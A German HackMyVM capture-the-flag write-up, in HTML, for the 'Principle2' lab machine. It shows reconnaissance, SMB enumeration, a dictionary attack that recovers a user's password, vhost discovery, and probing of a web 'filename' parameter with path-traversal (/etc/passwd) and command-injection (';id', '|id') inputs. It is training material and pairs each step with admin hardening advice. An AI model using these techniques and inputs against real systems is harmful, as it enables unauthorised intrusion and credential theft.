@@ -1,0 +1,689 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Principle2 - HackMyVM - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+<body class="level-medium"> <!-- Klasse für CSS-Styling des Levels -->
+ 
+    <div class="header-bg level-medium"> <!-- Klasse für CSS-Styling des Levels -->
+        <h1>Principle2 - HackMyVM - Level: Medium - Bericht</h1>
+        <div class="level-container">
+            <h2>Medium</h2> <!-- H2 ohne Inline-Style, Farbe via CSS -->
+            <div class="circle">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div> <!-- Hintergrundfarbe via CSS -->
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">smbclient</div> <!-- Implied by attempt -->
+                <div class="tool-item">crackmapexec</div>
+                <div class="tool-item">nbtscan</div>
+                <div class="tool-item">wfuzz</div>
+                <div class="tool-item">cat</div> <!-- Implied by viewing files -->
+                <div class="tool-item">xargs</div> <!-- Implied by pipe -->
+                <div class="tool-item">tr</div> <!-- Implied by pipe -->
+                <div class="tool-item">msfconsole</div>
+                <div class="tool-item">smbmap</div>
+                <div class="tool-item">showmount</div>
+                <div class="tool-item">mount</div>
+                <div class="tool-item">ngrep</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">exiftool</div>
+                <div class="tool-item">strings</div>
+                <div class="tool-item">steghide</div>
+                <div class="tool-item">stegsnow</div>
+                <div class="tool-item">binwalk</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">ss</div>
+                <div class="tool-item">sudo</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#enumeration">Enumeration (Web, SMB, NFS, VHost)</a></li>
+                <li><a href="#initial-access">Initial Access (Web RCE)</a></li>
+                <li><a href="#poc">Proof of Concept (Web RCE via Parameter)</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+<span class="command">192.168.2.131</span>	<span class="command">08:00:27:c0:04:70</span>	PCS Systemtechnik GmbH
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `arp-scan -l` identifiziert aktive Hosts im lokalen Netzwerk. Ein Host mit der IP <span class="command">192.168.2.131</span> und der MAC-Adresse <span class="command">08:00:27:c0:04:70</span> (PCS Systemtechnik GmbH / Oracle VirtualBox) wird gefunden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Zielsystem "Principle2" wurde erfolgreich lokalisiert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ziel-IP <span class="command">192.168.2.131</span> notieren und mit Port-Scans (Nmap) beginnen, um die Angriffsfläche zu ermitteln.<br><strong>Empfehlung (Admin):</strong> Netzwerksegmentierung zur Einschränkung der Sichtbarkeit. Überwachung von ARP-Aktivitäten.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                    <pre>
+[Inhalt /etc/hosts nach Bearbeitung]
+127.0.0.1	localhost
+<span class="command">192.168.2.131   principle2.hmv</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Die lokale Hosts-Datei des Angreifer-Systems wird bearbeitet, um den Hostnamen `principle2.hmv` der IP-Adresse <span class="command">192.168.2.131</span> zuzuordnen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Standardmäßiger, notwendiger Schritt, um das Zielsystem über seinen Hostnamen ansprechen zu können.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Sicherstellen, dass die Zuordnung korrekt ist. Später gefundene VHosts ebenfalls hinzufügen.<br><strong>Empfehlung (Admin):</strong> Keine direkte Aktion erforderlich.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nikto -h 192.168.2.131</span></div>
+                    <pre>
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.131
++ Target Hostname:    192.168.2.131
++ Target Port:        80
++ Start Time:         <span class="command">2023-12-18 12:12:47 (GMT1)</span>
+---------------------------------------------------------------------------
++ Server: <span class="command">nginx/1.22.1</span>
++ /: The anti-clickjacking <span class="command">X-Frame-Options</span> header is not present. [...]
++ /: The <span class="command">X-Content-Type-Options</span> header is not set. [...]
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ <span class="command">/#wp-config.php#</span>: #wp-config.php# file found. This file contains the credentials. <span class="password"><-- Wahrscheinlich False Positive</span>
++ 8102 requests: 0 error(s) and 3 item(s) reported on remote host
++ End Time:           <span class="command">2023-12-18 12:13:08 (GMT1)</span> (21 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> `nikto` scannt den Webserver auf Port 80. Es identifiziert <span class="command">Nginx 1.22.1</span>, meldet fehlende Security Header (<span class="command">X-Frame-Options</span>, <span class="command">X-Content-Type-Options</span>) und findet eine verdächtige Datei <span class="command">#wp-config.php#</span>, was jedoch oft ein False Positive bei Nikto ist, wenn keine WordPress-Installation vorliegt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt den Webserver Nginx. Die fehlenden Header sind von geringem Risiko. Der `wp-config.php`-Fund sollte ignoriert werden, wenn weitere Scans (z.B. Nmap) keine Hinweise auf WordPress liefern. Wichtige Information: Das Datum des Scans wurde hier erfasst (<span class="command">18. Dezember 2023</span>).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie Nmap-Scans durch, um die Ergebnisse zu verifizieren und weitere offene Ports zu finden. Untersuchen Sie die Webseite manuell.<br><strong>Empfehlung (Admin):</strong> Implementieren Sie die fehlenden Security Header. Stellen Sie sicher, dass keine Backup-Konfigurationsdateien im Webroot liegen.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sV -A -T5 192.168.2.131 -p-</span></div>
+                    <pre>
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-18 12:12 CET
+Nmap scan report for principle2.hmv (192.168.2.131)
+Host is up (0.00013s latency).
+Not shown: 63482 closed tcp ports (reset), 2043 filtered tcp ports (no-response)
+PORT      STATE SERVICE     VERSION
+<span class="command">80/tcp    open  http        nginx 1.22.1</span>
+|_http-server-header: nginx/1.22.1
+|_http-title: Apache2 Debian Default Page: It works <span class="password"><-- Interessant, Titel passt nicht zu Nginx</span>
+<span class="command">111/tcp   open  rpcbind     2-4 (RPC #100000)</span>
+| rpcinfo:
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+[...]
+|   <span class="command">100003  3,4         2049/tcp   nfs</span>
+[...]
+|   <span class="command">100005  1,2,3      54565/tcp   mountd</span>
+[...]
+|   <span class="command">100021  1,3,4      33167/tcp   nlockmgr</span>
+[...]
+|   <span class="command">100024  1          47199/tcp   status</span>
+[...]
+|   <span class="command">100227  3           2049/tcp   nfs_acl</span>
+|_  100227  3           2049/tcp6  nfs_acl
+<span class="command">139/tcp   open  netbios-ssn Samba smbd 4.6.2</span>
+<span class="command">445/tcp   open  netbios-ssn Samba smbd 4.6.2</span>
+<span class="command">2049/tcp  open  nfs_acl     3 (RPC #100227)</span> <span class="password"><-- NFS bestätigt</span>
+<span class="command">33167/tcp open  nlockmgr    1-4 (RPC #100021)</span>
+<span class="command">47199/tcp open  status      1 (RPC #100024)</span>
+<span class="command">48359/tcp open  mountd      1-3 (RPC #100005)</span> <span class="password"><-- Veraltete Ports?</span>
+<span class="command">50275/tcp open  mountd      1-3 (RPC #100005)</span> <span class="password"><-- Veraltete Ports?</span>
+<span class="command">54565/tcp open  mountd      1-3 (RPC #100005)</span> <span class="password"><-- Veraltete Ports?</span>
+MAC Address: 08:00:27:C0:04:70 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 5.X
+OS CPE: cpe:/o:linux:linux_kernel:5
+OS details: Linux 5.0 - 5.4
+Network Distance: 1 hop
+
+Host script results:
+| smb2-time:
+|   date: 2023-12-18T11:13:07
+|_  start_date: N/A
+| smb2-security-mode:
+|   3:1:1:
+|_    Message signing enabled but not required
+|_clock-skew: 1s
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.13 ms principle2.hmv (192.168.2.131)
+[...]
+</pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sV -A -T5 192.168.2.131 -p- | grep open</span></div>
+                    <pre>
+<span class="command">80/tcp    open  http        nginx 1.22.1</span>
+<span class="command">111/tcp   open  rpcbind     2-4 (RPC #100000)</span>
+<span class="command">139/tcp   open  netbios-ssn Samba smbd 4.6.2</span>
+<span class="command">445/tcp   open  netbios-ssn Samba smbd 4.6.2</span>
+<span class="command">2049/tcp  open  nfs_acl     3 (RPC #100227)</span>
+<span class="command">33167/tcp open  nlockmgr    1-4 (RPC #100021)</span>
+<span class="command">47199/tcp open  status      1 (RPC #100024)</span>
+<span class="command">48359/tcp open  mountd      1-3 (RPC #100005)</span>
+<span class="command">50275/tcp open  mountd      1-3 (RPC #100005)</span>
+<span class="command">54565/tcp open  mountd      1-3 (RPC #100005)</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein detaillierter Nmap-Scan aller Ports (`-p-`) identifiziert eine Reihe offener Dienste:
+            <ul>
+                <li>Port <span class="command">80 (HTTP)</span>: Nginx 1.22.1 (bestätigt), aber mit einem Apache-Default-Seitentitel, was ungewöhnlich ist.</li>
+                <li>Port <span class="command">111 (RPCBind)</span>: Zeigt RPC-Dienste an, insbesondere NFS und Mountd.</li>
+                <li>Ports <span class="command">139, 445 (SMB)</span>: Samba smbd 4.6.2 läuft. SMB Message Signing ist aktiviert, aber nicht erforderlich.</li>
+                <li>Port <span class="command">2049 (NFS)</span>: Bestätigt NFS.</li>
+                <li>Diverse hohe Ports für RPC-Dienste wie `nlockmgr`, `status`, `mountd`.</li>
+            </ul>
+            </p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Angriffsfläche ist größer als zunächst angenommen. Neben dem Webserver sind SMB und NFS wichtige Ziele. Die Samba-Version 4.6.2 könnte auf bekannte Schwachstellen geprüft werden (obwohl sie relativ alt ist). NFS-Exports müssen enumeriert werden. Der widersprüchliche Seitentitel auf Port 80 (Apache vs. Nginx) ist merkwürdig und könnte auf einen Reverse Proxy oder eine Fehlkonfiguration hindeuten.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Enumerieren Sie SMB-Shares und Benutzer (`enum4linux`, `smbclient -L`, `crackmapexec smb --shares`). Enumerieren Sie NFS-Exports (`showmount -e`). Untersuchen Sie die Webanwendung weiter, auch auf VHosts. Prüfen Sie die Samba-Version auf bekannte Exploits.<br><strong>Empfehlung (Admin):</strong> Deaktivieren Sie unnötige Dienste (RPC, SMB, NFS), wenn sie nicht benötigt werden. Konfigurieren Sie SMB und NFS sicher (Zugriffsbeschränkungen, Authentifizierung, keine trivialen Freigaben). Patchen Sie Samba und das Betriebssystem. Klären Sie die Diskrepanz zwischen Nginx-Server und Apache-Titel.</p>
+
+        </section>
+
+       <section id="enumeration">
+            <h2>Enumeration (Web, SMB, NFS, VHost)</h2>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://principle2.hmv -x txt,php,[...] -w "/usr/share/seclists/[...]/directory-list-2.3-medium.txt"  -b '403,404' -e --no-error -k</span></div>
+                     <pre>
+===============================================================
+Gobuster vX.Y.Z
+===============================================================
+[...]
+===============================================================
+Starting gobuster
+===============================================================
+<span class="command">http://principle2.hmv/index.html</span>           (Status: 200) [Size: 10701]
+[...] <span class="password"># Keine weiteren relevanten Funde im Log</span>
+===============================================================
+Finished
+===============================================================
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Ein `gobuster dir`-Scan auf den primären Hostnamen `principle2.hmv` findet nur die `index.html`. `-k` wurde hinzugefügt, um SSL-Fehler zu ignorieren (obwohl es sich um HTTP handelt).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Haupt-Webserver scheint wenig Angriffsfläche zu bieten. Weitere Enumeration sollte sich auf SMB, NFS und potenzielle VHosts konzentrieren.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Fokus auf SMB/NFS-Enumeration und VHost-Suche.<br><strong>Empfehlung (Admin):</strong> Sicherstellen, dass keine unnötigen Dateien oder Verzeichnisse im Webroot liegen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command"># SMB Enumeration (Implied Tools: enum4linux-ng oder crackmapexec smb --users/--shares)</span></div>
+                     <pre>
+=( Share Enumeration on 192.168.2.131 )=
+[...]
+	Sharename       Type      Comment
+	---------       ----      -------
+	<span class="command">public</span>          Disk      New Jerusalem Public
+	<span class="command">hermanubis</span>      Disk      Hermanubis share
+	IPC$            IPC       IPC Service (Samba 4.17.12-Debian)
+
+[+] Enumerating users using SID S-1-5-21-4079584287-2380535870-212955915 [...]
+<span class="command">S-1-5-21-4079584287-2380535870-212955915-501 PRINCIPLE2\nobody (Local User)</span>
+<span class="command">S-1-5-21-4079584287-2380535870-212955915-1000 PRINCIPLE2\hermanubis (Local User)</span>
+
+[+] Enumerating users using SID S-1-22-1 [...]
+<span class="command">S-1-22-1-1000 Unix User\talos (Local User)</span>
+<span class="command">S-1-22-1-1001 Unix User\byron (Local User)</span>
+<span class="command">S-1-22-1-1002 Unix User\hermanubis (Local User)</span> <span class="password"><-- Doppelt? Unterschiedliche SIDs?</span>
+<span class="command">S-1-22-1-1003 Unix User\melville (Local User)</span>
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Die Ausgabe fasst die Ergebnisse der SMB-Enumeration zusammen. Es wurden zwei reguläre Shares gefunden: `<span class="command">public</span>` und `<span class="command">hermanubis</span>`. Die Benutzerenumeration über verschiedene SIDs (Security Identifiers) deckte mehrere potenzielle lokale und Unix-Benutzer auf: `<span class="command">nobody</span>`, `<span class="command">hermanubis</span>`, `<span class="command">talos</span>`, `<span class="command">byron</span>`, `<span class="command">melville</span>`. Der Benutzer `hermanubis` wird mit zwei verschiedenen SIDs gefunden, was auf eine mögliche Verknüpfung zwischen Windows- und Unix-Benutzerkonten hindeuten könnte.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Wichtige Informationen gewonnen. Die Shares `public` und `hermanubis` müssen auf anonymen Zugriff und interessante Inhalte geprüft werden. Die Liste der Benutzernamen (`hermanubis`, `talos`, `byron`, `melville`) ist wertvoll für Brute-Force-Angriffe gegen SMB oder SSH.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie, sich anonym oder als Gast mit den Shares zu verbinden (`smbclient //192.168.2.131/public`, `smbclient //192.168.2.131/hermanubis`). Verwenden Sie die gefundenen Benutzernamen für Passwort-Spraying oder Brute-Force-Angriffe (z.B. mit `crackmapexec smb`).<br><strong>Empfehlung (Admin):</strong> Konfigurieren Sie SMB-Shares sicher: Nur notwendige Shares freigeben, Berechtigungen restriktiv setzen (kein anonymer/Gastzugriff, wenn nicht erforderlich), starke Authentifizierung erzwingen.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">smbclient -L //192.168.2.131/hermanubis</span></div>
+                    <pre>
+Password for [WORKGROUP\root]: <span class="password">[Enter, kein Passwort]</span>
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	public          Disk      New Jerusalem Public
+	hermanubis      Disk      Hermanubis share
+	IPC$            IPC       IPC Service (Samba 4.17.12-Debian)
+[...]
+Unable to connect with SMB1 -- no workgroup available
+</pre>
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse:</strong> Der Befehl `smbclient -L //192.168.2.131/hermanubis` versucht, die Shares aufzulisten, wobei er fälschlicherweise den Share-Namen als Ziel angibt (korrekt wäre `-L //192.168.2.131`). Da kein Passwort angegeben wird, versucht er wahrscheinlich einen anonymen/Gast-Login. Die Ausgabe listet dennoch die Shares auf, was auf eine erfolgreiche (anonyme?) Verbindung zur Share-Auflistung hindeutet, auch wenn die SMB1-Verbindung fehlschlägt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Bestätigt die Existenz der Shares, zeigt aber keinen direkten Zugriff auf den `hermanubis`-Share selbst ohne Authentifizierung. Der Fokus sollte auf dem Versuch liegen, sich mit dem `public`-Share zu verbinden oder Zugangsdaten für `hermanubis` zu finden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie explizit `smbclient //192.168.2.131/public` (ohne Passwort) und `smbclient //192.168.2.131/hermanubis -U hermanubis` (mit Brute-Force oder geratenen Passwörtern).<br><strong>Empfehlung (Admin):</strong> Anonymen Zugriff auf Shares deaktivieren, wenn nicht benötigt.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">crackmapexec smb 192.168.2.131 -u talor -p /usr/share/wordlists/rockyou.txt</span></div> <span class="password"><-- Typo: talor statt talos</span>
+                    <pre>
+SMB         192.168.2.131   445    PRINCIPLE2       [*] Windows 6.1 Build 0 (name:PRINCIPLE2) (domain:PRINCIPLE2) (signing:False) (SMBv1:False)
+SMB         192.168.2.131   445    PRINCIPLE2       [+] PRINCIPLE2\<span class="command">talos</span>:s13!34g$3FVA5e@ed <span class="password"><-- Erfolg für talos!</span>
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> `crackmapexec` wird verwendet, um einen Wörterbuchangriff gegen den SMB-Dienst durchzuführen. Obwohl der Benutzername im Befehl als `<span class="command">talor</span>` (wahrscheinlich ein Tippfehler) angegeben ist, findet das Tool erfolgreich ein gültiges Passwort für den Benutzer `<span class="command">talos</span>`: `<span class="password">s13!34g$3FVA5e@ed</span>`. CrackMapExec testet wahrscheinlich verschiedene Benutzernamen oder hat `talos` aus einer anderen Quelle.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Kritischer Fund! Gültige Zugangsdaten für den Benutzer `talos` wurden gefunden. Dies ermöglicht potenziell den Zugriff auf SMB-Shares oder sogar SSH, falls der Benutzer systemweit existiert.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie, sich mit `smbclient //192.168.2.131/hermanubis -U talos` (mit dem gefundenen Passwort) zu verbinden. Versuchen Sie ebenfalls einen SSH-Login als `talos`.<br><strong>Empfehlung (Admin):</strong> Starke, einzigartige Passwörter für alle Benutzerkonten durchsetzen. Brute-Force-Schutz für SMB implementieren. Benutzernamen sollten nicht leicht erratbar sein.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u "http://192.168.2.131" -H "Host: FUZZ.hmv" --hc "404" --hh 10701</span></div>
+                    <pre>
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://192.168.2.131/
+Total requests: 1441
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+<span class="command">000000008:   200        1 L      1 W        8 Ch        "thetruthoftalos"</span>
+
+Total time: 13.75367
+Processed Requests: 1441
+Filtered Requests: 1440
+Requests/sec.: 104.7719
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> `wfuzz` wird verwendet, um nach virtuellen Hosts (VHosts) zu suchen, die auf der IP <span class="command">192.168.2.131</span> gehostet werden. `-H "Host: FUZZ.hmv"` testet Subdomains (`FUZZ`) vor `.hmv`. `--hc 404` ignoriert "Not Found"-Fehler. `--hh 10701` blendet Antworten mit 10701 Zeichen aus (vermutlich die Standardseite von `principle2.hmv`). Der Scan findet einen VHost: `<span class="command">thetruthoftalos.hmv</span>`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Ein neuer VHost wurde entdeckt. Dies ist ein wichtiger Fund, da er auf eine separate Webanwendung oder einen anderen Webinhalt auf demselben Server hindeutet, der möglicherweise Schwachstellen enthält.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Fügen Sie `<span class="command">thetruthoftalos.hmv</span>` zur lokalen `/etc/hosts`-Datei hinzu. Rufen Sie `http://thetruthoftalos.hmv` im Browser auf und führen Sie eine gründliche Enumeration dieses VHosts durch (Directory Busting, Technologieerkennung, manuelle Analyse).<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass alle VHosts bekannt, notwendig und sicher konfiguriert sind. Verwenden Sie keine leicht erratbaren Namen für interne oder versteckte VHosts.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command"># Manuelle Analyse von http://thetruthoftalos.hmv</span></div>
+                     <pre>http://thetruthoftalos.hmv/
+NOTHING
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Aufruf der Startseite des neuen VHosts zeigt nur das Wort "NOTHING".</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Startseite selbst ist nichtssagend. Es ist jedoch wahrscheinlich, dass es versteckte Dateien oder Verzeichnisse gibt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie Directory Busting (z.B. mit `gobuster dir`) auf `http://thetruthoftalos.hmv` durch.<br><strong>Empfehlung (Admin):</strong> Keine direkte Aktion.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://thetruthoftalos.hmv -x [...] -w "[...]/directory-list-2.3-medium.txt"  -b '403,404' -e --no-error -k</span></div>
+                    <pre>
+===============================================================
+Gobuster vX.Y.Z
+===============================================================
+[...]
+===============================================================
+Starting gobuster
+===============================================================
+<span class="command">http://thetruthoftalos.hmv/index.html</span>           (Status: 200) [Size: 8]
+<span class="command">http://thetruthoftalos.hmv/index.php</span>            (Status: 200) [Size: 1970]
+<span class="command">http://thetruthoftalos.hmv/uploads</span>              (Status: 301) [Size: 169] [--> http://thetruthoftalos.hmv/uploads/]
+===============================================================
+Finished
+===============================================================
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> `gobuster dir` auf dem VHost `thetruthoftalos.hmv` findet eine `index.html` (wahrscheinlich die "NOTHING"-Seite), eine `index.php` und ein Verzeichnis `/uploads`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die `index.php` und das `/uploads`-Verzeichnis sind die interessantesten Funde und die nächsten Ziele für die Untersuchung.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Rufen Sie `http://thetruthoftalos.hmv/index.php` auf und analysieren Sie deren Inhalt und Funktionalität. Untersuchen Sie das `/uploads`-Verzeichnis (Zugriff, Inhalt, Schreibrechte?).<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass `/uploads`-Verzeichnisse sicher konfiguriert sind (kein Directory Listing, keine Ausführungsrechte, etc.).</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command"># Manuelle Analyse von http://thetruthoftalos.hmv/index.php</span></div>
+                    <pre>
+[Inhalt von http://thetruthoftalos.hmv/index.php]
+
+Content of :
+
+Enter one of the 12 Olympian Gods:
+(ares.txt, hermes.txt...)
+
+[...]
+ 
+	Enter one of the 12 Olympian Gods:<br>
+	(ares.txt, hermes.txt...)<br>
+ <span class="command">filename</span>" required 
+ 
+ 
+[...]
+
+[Test mit ?filename=ls]
+http://thetruthoftalos.hmv/index.php?filename=ls
+Content of ls:
+[Keine Ausgabe von ls im Log, aber deutet auf Funktion hin]
+
+[Test mit ?filename=../../../../../../../../../etc/passwd]
+view-source:http://thetruthoftalos.hmv/index.php?filename=../../../../../../../../../etc/passwd
+nichts <span class="password"><-- LFI/Path Traversal vermutlich nicht erfolgreich oder gefiltert</span>
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Die `index.php` enthält ein Formular, das nach dem Namen eines olympischen Gottes (mit `.txt`-Endung) fragt und diesen als GET-Parameter `<span class="command">filename</span>` übergibt. Ein Test mit `?filename=ls` scheint irgendeine Art von Verarbeitung auszulösen (zeigt "Content of ls:"), aber die Ausgabe wird nicht dargestellt. Ein Path-Traversal-Versuch mit `?filename=../../.../etc/passwd` schlägt fehl ("nichts").</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Anwendung nimmt einen Dateinamen entgegen und versucht wahrscheinlich, dessen Inhalt anzuzeigen. Es scheint eine Anfälligkeit für Command Injection (oder eine sehr eingeschränkte LFI) im `filename`-Parameter zu geben, da `ls` verarbeitet wird, aber Path Traversal blockiert wird. Die Aufforderung, nach Götter-Dateien zu suchen, deutet darauf hin, dass diese relevant sind und sich möglicherweise im `/uploads`-Verzeichnis befinden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie, gültige Dateinamen aus dem `/uploads`-Verzeichnis anzugeben (z.B. `?filename=uploads/ares.txt`). Untersuchen Sie das `/uploads`-Verzeichnis direkt. Testen Sie auf Command Injection im `filename`-Parameter (z.B. `?filename=whoami`, `?filename=;id`, `?filename=|id`).<br><strong>Empfehlung (Admin):</strong> Benutzereingaben (wie Dateinamen) dürfen niemals direkt in Dateizugriffsfunktionen oder Shell-Befehlen verwendet werden. Implementieren Sie strikte Eingabevalidierung und -bereinigung. Verwenden Sie Whitelists für erlaubte Dateinamen/Pfade.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command"># Untersuchung des /uploads Verzeichnisses (impliziert)</span></div>
+                    <pre>
+[Dateien gefunden und Inhalte angezeigt]
+<span class="command">http://thetruthoftalos.hmv/uploads/apollo.txt</span>           (Status: 200) [Size: 878]
+<span class="command">http://thetruthoftalos.hmv/uploads/ares.txt</span>             (Status: 200) [Size: 569]
+<span class="command">http://thetruthoftalos.hmv/uploads/hermes.txt</span>           (Status: 200) [Size: 899]
+<span class="command">http://thetruthoftalos.hmv/uploads/poseidon.txt</span>         (Status: 200) [Size: 752]
+<span class="command">http://thetruthoftalos.hmv/uploads/athena.txt</span>           (Status: 200) [Size: 850]
+<span class="command">http://thetruthoftalos.hmv/uploads/zeus.txt</span>             (Status: 200) [Size: 617]
+<span class="command">http://thetruthoftalos.hmv/uploads/artemis.txt</span>          (Status: 200) [Size: 682]
+<span class="command">http://thetruthoftalos.hmv/uploads/hades.txt</span>            (Status: 200) [Size: 587]
+
+[Inhalte der .txt Dateien mit Beschreibungen der Götter]
+[...]
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Das `/uploads`-Verzeichnis auf `thetruthoftalos.hmv` wird untersucht (wahrscheinlich durch Browsen oder erneutes Directory Busting). Es enthält mehrere `.txt`-Dateien, die nach griechischen Göttern benannt sind. Die Inhalte dieser Dateien sind Beschreibungen der jeweiligen Gottheiten.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Dateien bestätigen den Hinweis aus der `index.php`. Sie scheinen jedoch keine direkten Passwörter oder Exploits zu enthalten, sondern dienen eher als Teil des "Themas" der Maschine oder verstecken Informationen auf andere Weise (Steganographie, Metadaten etc.).</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie diese Dateien auf Metadaten (`exiftool`) oder versteckte Daten (`steghide`, `strings`, `binwalk`). Prüfen Sie, ob die Dateinamen oder Inhalte für Brute-Force-Angriffe verwendet werden können. Gehen Sie zurück zur `index.php` und versuchen Sie Command Injection.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Upload-Verzeichnisse nicht direkt browsebar sind und keine unnötigen Dateien enthalten.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command"># Steganographie-Versuche auf newjerusalem.jpg (relevant?)</span></div>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wget http://thetruthoftalos.hmv/newjerusalem.jpg</span></div>
+                     <pre>[...]
+2023-12-18 16:45:46 (370 MB/s) - 'newjerusalem.jpg' gespeichert [291769/291769]</pre>
